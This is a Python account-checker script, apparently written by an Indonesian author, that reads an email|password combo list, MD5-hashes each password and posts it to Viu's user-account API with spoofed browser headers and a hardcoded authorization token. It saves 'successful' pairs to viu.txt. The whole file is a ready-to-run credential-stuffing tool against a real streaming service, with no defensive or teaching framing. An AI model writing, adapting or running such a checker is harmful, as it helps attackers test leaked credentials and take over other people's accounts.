#!/usr/bin/env python
# coding: utf-8
# Recode Mandul 7 turunan

from art import *
import requests, colorama, os, random, pyfiglet, hashlib, urllib.parse
from http import cookiejar
BLU = colorama.Style.BRIGHT + colorama.Fore.BLUE
CYA = colorama.Style.BRIGHT + colorama.Fore.CYAN
GRE = colorama.Style.BRIGHT + colorama.Fore.GREEN
YEL = colorama.Style.BRIGHT + colorama.Fore.YELLOW
RED = colorama.Style.BRIGHT + colorama.Fore.RED
MAG = colorama.Style.BRIGHT + colorama.Fore.MAGENTA
LIYEL = colorama.Style.BRIGHT + colorama.Fore.LIGHTYELLOW_EX
LIRED = colorama.Style.BRIGHT + colorama.Fore.LIGHTRED_EX
LIMAG = colorama.Style.BRIGHT + colorama.Fore.LIGHTMAGENTA_EX
LIBLU = colorama.Style.BRIGHT + colorama.Fore.LIGHTBLUE_EX
LICYA = colorama.Style.BRIGHT + colorama.Fore.LIGHTCYAN_EX
LIGRE = colorama.Style.BRIGHT + colorama.Fore.LIGHTGREEN_EX
BOLD = colorama.Style.BRIGHT
RESET = colorama.Fore.RESET
CLEAR = 'cls' if os.name == 'nt' else 'clear'
COLORS = BLU, CYA, GRE, YEL, RED, MAG, LIYEL, LIRED, LIMAG, LIBLU, LICYA, LIGRE
FONTS = 'basic', 'o8', 'cosmic', 'graffiti', 'chunky', 'epic', 'doom', 'avatar', 'this',
font = random.choice(FONTS)
colorama.init(autoreset=True)
color2 = random.choice(COLORS)
#c = 0

class BlockCookies(cookiejar.CookiePolicy):
    return_ok = set_ok = domain_return_ok = path_return_ok = lambda self, *args, **kwargs: False
    netscape = True
    rfc2965 = hide_cookie2 = False
r = requests.Session()
r.cookies.set_policy(BlockCookies()) 


def logo() -> None:
    os.system(CLEAR)
    color1 = random.choice(COLORS)
    color2 = random.choice(COLORS)
    while color1 == color2:
        color2 = random.choice(COLORS)
    print(color1 + '_' * os.get_terminal_size().columns, end='\n'*2)
    print(color2 + pyfiglet.figlet_format('JOOX', font=font, justify='center', width=os.get_terminal_size().columns), end='')
    msg = '[Author RH DYAR AP]'
    _ = int(os.get_terminal_size().columns/2)
    _ -= int(len(msg)/2)
    print(color1 + '=' * _ + LIYEL + msg + color1 + '=' * _ + '\n')
logo()


d = input(f'{random.choice(COLORS)}                         Input List > ')
devices = open(d, 'r+',  encoding="utf-8").read().splitlines()

try:      
    for list in devices:
        pisah = list.strip()
        empas = list.split('|')

        usr = empas[0]
        pas = empas[1]
        account = usr+'|'+pas
        pwd = hashlib.md5(pas.encode())
        pwds = pwd.hexdigest()

        #print(f'{usr}={pwds}')

        headers = {
            'authority': 'um.viuapi.io',
            'accept': 'application/json',
            'accept-language': 'en-US,en;q=0.9',
            'authorization': 'eyJhbGciOiJBMTI4S1ciLCJlbmMiOiJBMTI4Q0JDLUhTMjU2In0.4XS0vEhwN0Tg3DQHlkrkqpWXkYk2GwiVvDZwfG9dINWuTbg8aM6EVg.CYhCGPDHcNjXWoCZhRY-Hg.wCy9b75sEETOMDLsWCqFVrLzC0jT7mCCYcXbX1cbuFIiOmMGEhrEcRPsg22F0pri4RVi4qAWToJrT5ZaZx-4cBHVX2V_QXiqZ-2E4nPK-2q0NpIdwGDSEszTwBOLS_U-34AeuiFv4QJsNEeMhc55fA1cEOADGzGNNezGDM-OmK1eVO6gAt1tvNYQP93SRngDdbv0OUgzBIQmUHko8tbEd3Oqw5nA9xntGTT5nru-m68.-kyaz1FKHZB_gVcqLTlI3g',
            # Already added when you pass json=
            # 'content-type': 'application/json',
            'origin': 'https://www.viu.com',
            'referer': 'https://www.viu.com/',
            'sec-ch-ua': '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36',
            'x-client': 'browser',
            'x-request-id': 'b668f368-872f-4bad-b92f-c47e3625ea28',
            'x-session-id': '9f61c4e5-f089-44bc-8f61-1e7bf0c45ea9',
        }

        params = {
            'ver': '1.0',
            'fmt': 'json',
            'aver': '5.0',
            'appver': '2.0',
            'appid': 'viu_desktop',
            'platform': 'desktop',
            'iid': 'f8df3df3-d8de-48e1-87a0-0f0716a7ccb7',
        }

        json_data = {
            'principal': usr,
            'providerCode': 'email',
            'password': pwds,
        }

        response = requests.post('https://um.viuapi.io/user/account', params=params, headers=headers, json=json_data)  
        if "exists" in response.text:
            #info = requests.get('https://www.joox.com/id/vip', cookies=cookies, headers=headers)
            #paket = re.findall('', info)
        
            print(f"{GRE}[+]{account} => SUKSES LOGIN".center(os.get_terminal_size().columns))
            open('viu.txt', "a+").write(f'{account}\n')
        else:
            print(f"{RED}[-]{account} => GAGAl LOGIN".center(os.get_terminal_size().columns))   
except KeyboardInterrupt:
        print(f"{BOLD}Oh! you pressed CTRL + C.".center(os.get_terminal_size().columns))
        print(f"{BOLD}Proses Di hentikan :) ".center(os.get_terminal_size().columns))  